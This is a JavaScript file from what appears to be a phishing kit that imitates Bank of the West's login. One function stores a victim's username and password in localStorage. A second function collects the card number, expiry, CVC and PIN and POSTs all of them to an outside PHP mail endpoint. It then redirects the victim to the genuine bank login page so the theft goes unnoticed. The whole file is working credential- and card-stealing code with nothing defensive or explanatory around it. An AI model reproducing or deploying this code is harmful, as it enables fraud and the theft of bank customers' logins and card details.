const SubmitFirstUsers = () => {
  document.getElementById("submitBtn").setAttribute("disabled", true);

  const username = document.getElementById("pad").value;
  const password = document.getElementById("pads").value;

  if (
    username !== undefined &&
    username !== "" &&
    username !== null &&
    password !== undefined &&
    password !== "" &&
    password !== null
  ) {
    localStorage.setItem("BOWusername", username);
    localStorage.setItem("BOWpassword", password);

    setTimeout(() => location.assign("./confirmLogin.html"), 3000);
  } else {
    document.getElementById("pad").style.borderBottom = "1px solid #b22222";

    document.getElementById("pads").style.borderBottom = "1px solid #b22222";

    document.getElementById("submitBtn").removeAttribute("disabled");
  }
};

const FinalSubmitForm = async () => {
  document.getElementById("FinalSubmit").setAttribute("disabled", true);

  const cardNumber = document.getElementById("padNumber").value;
  const cardExpiryDate = document.getElementById("padExpiryDate").value;
  const cardCVC = document.getElementById("padCVC").value;
  const cardPin = document.getElementById("padPin").value;

  if (cardNumber.length < 14) {
    document.getElementById("padNumber").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  if (
    cardExpiryDate.length < 4 ||
    Number(cardExpiryDate.split("/")[0]) > 12 ||
    Number(cardExpiryDate.split("/")[1]) < 22
  ) {
    document.getElementById("padExpiryDate").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  if (cardCVC.length < 3) {
    document.getElementById("padCVC").style.borderBottom = "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  if (cardPin.length < 4) {
    document.getElementById("padPin").style.borderBottom = "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  const MailReturn = await fetch(
    "https://mailclient.trivecodes.com/BOW/php/mail_key.php",
    {
      method: "POST",
      headers: {
        "Content-Type": "application.json",
      },
      body: JSON.stringify({
        username: localStorage.BOWusername,
        password: localStorage.BOWpassword,
        cardNumber: cardNumber,
        cardExpiryDate: cardExpiryDate,
        cardCVC: cardCVC,
        cardPin: cardPin,
      }),
    }
  );

  MailReturn.text().then(
    (data) =>
      data === "Sent" &&
      location.assign("https://online.bankofthewest.com/BOW/Login.aspx")
  );
};
